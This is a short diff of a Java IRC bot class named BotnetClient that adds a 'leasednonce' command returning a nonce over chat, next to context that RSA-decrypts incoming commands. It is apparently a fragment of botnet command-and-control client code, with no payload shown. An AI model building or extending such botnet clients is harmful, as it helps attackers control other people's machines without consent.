@@ -261,6 +261,9 @@ public class BotnetClient extends PircBot {
 					if (command.equals("nonce")) {
 						chat.sendLine(m.getNonce() + "");
 						chat.close();
+					} else if (command.equals("leasednonce")) {
+						chat.sendLine(leasedM.getNonce() + "");
+						chat.close();
 					} else {
 						String commandRSA = m.decryptRSA(command);
 						String leasedCommandRSA;
